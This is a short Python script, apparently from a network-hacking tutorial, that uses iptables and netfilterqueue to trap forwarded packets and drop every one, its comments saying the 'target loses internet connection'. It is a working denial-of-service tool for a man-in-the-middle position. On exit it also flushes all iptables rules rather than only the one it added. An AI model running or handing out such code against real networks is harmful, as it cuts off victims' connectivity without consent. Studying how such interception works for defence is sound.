import netfilterqueue
import subprocess

def process_packet(packet):
    print(packet) # Displays incoming packets: eg TCP packet, 60 bytes UDP packet, 78 bytes. Note that this is not same as a scapy packet
    #print(packet.get_payload) To print more info about the packet, will be similar to the RAW layer of a scapy packet
    # packet.accept() # Forward the packet to the target
    packet.drop() # The target loses internet connection

try:
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True) # Create a modified IP table
    queue = netfilterqueue.NetfilterQueue() # Creating an object
    queue.bind(0, process_packet) # Will bind this queue to the queue we created:  queue-num-0
    # process_packet function will be called for each packet which gets trapped in the queue
    queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True) # Delete the IP table we created